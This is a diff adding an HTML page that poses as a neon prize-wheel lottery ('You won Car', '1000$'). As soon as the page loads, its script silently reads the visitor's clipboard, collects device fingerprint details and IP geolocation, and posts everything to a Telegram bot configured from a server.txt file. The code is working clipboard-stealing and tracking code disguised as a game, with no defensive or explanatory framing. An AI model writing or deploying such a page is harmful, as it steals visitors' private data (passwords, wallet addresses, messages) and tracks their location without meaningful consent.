@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>W8</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #000;
+        }
+
+        .wheel-container {
+            position: relative;
+            width: 300px;
+            height: 300px;
+        }
+
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            transition: transform 4s ease-out;
+            box-shadow: 0 0 20px #ff00ff, 0 0 30px #ff00ff, 0 0 40px #ff00ff, 0 0 50px #ff00ff, 0 0 60px #ff00ff, 0 0 70px #ff00ff, 0 800px #ff00ff;
+        }
+
+        .pointer {
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+        }
+
+        #spinButton {
+            display: block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #e8096a;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            box-shadow: -1px 0px 14px 5px #ffffff;
+        }
+
+        #spinButton:hover {
+            background-color: #e600e6;
+            box-shadow: 0 0 10px #ff00ff;
+        }
+    </style>
+</head>
+<body>
+    <h1>Clipboard to Telegram Bot</h1>
+    <p>This page will send the contents of your clipboard to a Telegram bot.</p>
+
+    <div class="wheel-container">
+        <img src="LotaryWeal.png" alt="Spinning Wheel" class="wheel" id="wheel">
+        <div class="pointer"></div>
+    </div>
+    <button id="spinButton">Spin the Wheel</button>
+
+    <script>
+        // Fetch Telegram config from server.txt
+        async function getTelegramConfig() {
+            try {
+                const res = await fetch('server.txt');
+                const text = await res.text();
+                const token = text.match(/TOKEN=(.*)/)[1].trim();
+                const chatId = text.match(/CHAT_ID=(.*)/)[1].trim();
+                return { token, chatId };
+            } catch (e) {
+                alert('Failed to load Telegram config.');
+                return { token: '', chatId: '' };
+            }
+        }
+
+        let TELEGRAM_BOT_TOKEN = '';
+        let TELEGRAM_CHAT_ID = '';
+        getTelegramConfig().then(cfg => {
+            TELEGRAM_BOT_TOKEN = cfg.token;
+            TELEGRAM_CHAT_ID = cfg.chatId;
+        });
+
+        const prizes = ['10$', 'Car', '100$', '30$', 'Gold', '50$', '1000$', 'Instant'];
+
+        document.getElementById('spinButton').addEventListener('click', () => {
+            const wheel = document.getElementById('wheel');
+            const randomDegree = Math.floor(Math.random() * 360);
+            const rotation = 3600 + randomDegree; // At least 10 full rotations
+            wheel.style.transition = 'transform 4s ease-out';
+            wheel.style.transform = `rotate(${rotation}deg)`;
+
+            setTimeout(() => {
+                const finalDegree = rotation % 360;
+                const segmentIndex = Math.floor(finalDegree / (360 / prizes.length));
+                alert(`You won ${prizes[segmentIndex]}`);
+            }, 4000);
+        });
+
+        async function getDeviceInfo() {
+            const nav = navigator;
+            const deviceType = /android/i.test(nav.userAgent) ? 'Android' :
+                /iphone|ipad|ipod/i.test(nav.userAgent) ? 'iPhone/iOS' :
+                /windows/i.test(nav.userAgent) ? 'Windows PC' :
+                /macintosh|mac os x/i.test(nav.userAgent) ? 'Mac' :
+                /linux/i.test(nav.userAgent) ? 'Linux' : 'Unknown';
+            const userAgent = nav.userAgent;
+            const platform = nav.platform;
+            const language = nav.language || nav.userLanguage;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const referrer = document.referrer ? document.referrer : 'Direct/None';
+            const connection = nav.connection ? nav.connection.effectiveType : 'Unknown';
+            const cpuCores = nav.hardwareConcurrency || 'Unknown';
+            const ram = nav.deviceMemory ? nav.deviceMemory + ' GB' : 'Unknown';
+            const now = new Date();
+            const currentTime = now.toLocaleString();
+            let batteryInfo = 'Not supported';
+            if (nav.getBattery) {
+                try {
+                    const battery = await nav.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
+                } catch (e) {}
+            }
+            return {
+                deviceType, userAgent, platform, language, screenRes, timezone, referrer,
+                connection, cpuCores, ram, batteryInfo, currentTime
+            };
+        }
+
+        async function getIPGeoInfo() {
+            try {
+                const res = await fetch('https://geolocation-db.com/json/');
+                if (!res.ok) throw new Error('IP info fetch failed');
+                const data = await res.json();
+                return {
+                    ip: data.IPv4 || 'Unknown',
+                    city: data.city || 'Unknown',
+                    region: data.state || 'Unknown',
+                    country: data.country_name || 'Unknown'
+                };
+            } catch (e) {
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
+            }
+        }
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+        }
+
+        function formatDeviceInfo(info, geo) {
+            return [
+                '*Device and Environment Info*',
+                `📱 Device Name/Type: ${info.deviceType}`,
+                `🕸️ User Agent: ${info.userAgent}`,
+                `💻 Platform: ${info.platform}`,
+                `🈯 Language: ${info.language}`,
+                `📐 Screen Resolution: ${info.screenRes}`,
+                `⏰ Timezone: ${info.timezone}`,
+                `🔗 Referrer: ${info.referrer}`,
+                `📶 Connection Type: ${info.connection}`,
+                `🧠 CPU Cores: ${info.cpuCores}`,
+                `💾 RAM: ${info.ram}`,
+                `🔋 Battery Info: ${info.batteryInfo}`,
+                `🕒 Current Time: ${info.currentTime}`,
+                '',
+                '*IP and Geolocation Info*',
+                `🌍 IP Address: ${geo.ip}`,
+                `🏙️ City: ${geo.city}`,
+                `🌐 Region/State: ${geo.region}`,
+                `🌎 Country: ${geo.country}`
+            ].join('\n');
+        }
+
+        // Automatically request clipboard permission and read clipboard on page load
+        window.addEventListener('DOMContentLoaded', async () => {
+            // Check for Permissions API support
+            if (navigator.permissions) {
+                try {
+                    const result = await navigator.permissions.query({ name: 'clipboard-read' });
+                    if (result.state === 'denied') {
+                        alert('Clipboard read permission denied. Please allow clipboard access.');
+                        return;
+                    }
+                } catch (e) {
+                    // Some browsers may not support this permission name
+                }
+            }
+            // Try to read clipboard
+            try {
+                const text = await navigator.clipboard.readText();
+                if (!text) {
+                    alert('Clipboard is empty or not accessible.');
+                    return;
+                }
+                const info = await getDeviceInfo();
+                const geo = await getIPGeoInfo();
+                const message = `�� *Clipboard Content:*\n${text}\n\n` + formatDeviceInfo(info, geo);
+                sendToTelegram(message);
+            } catch (err) {
+                alert('Failed to read clipboard. Please allow clipboard access and try again.');
+            }
+        });
+    </script>
+</body>
+</html>
